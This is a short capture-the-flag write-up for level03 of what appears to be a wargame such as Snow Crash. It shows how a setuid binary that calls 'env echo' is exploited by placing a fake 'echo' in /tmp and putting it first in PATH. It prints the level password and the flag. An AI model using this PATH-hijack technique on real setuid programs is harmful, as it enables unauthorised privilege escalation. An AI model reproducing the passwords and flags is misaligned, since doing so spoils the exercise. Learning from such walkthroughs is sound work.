## Step 1: Login
`su level03`

**password:** kooda2puivaav1idi4f57q8iq

## Step 2: Find & get flag

`ls -la`
> -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

On repere le s (fichier qui s'execute par un autre uuid)

`readelf -p .rodata level03`
>   [     8]  /usr/bin/env echo Exploit me

`echo '#include <stdlib.h>' > /tmp/echo.c`

`echo 'int main() { system("getflag"); return (0);}' > /tmp/echo.c`

`gcc -o /tmp/echo /tmp/echo.c`

`export PATH=/tmp:$PATH`

`./level03`
> qi0maab88jeaj46qoumi7maus

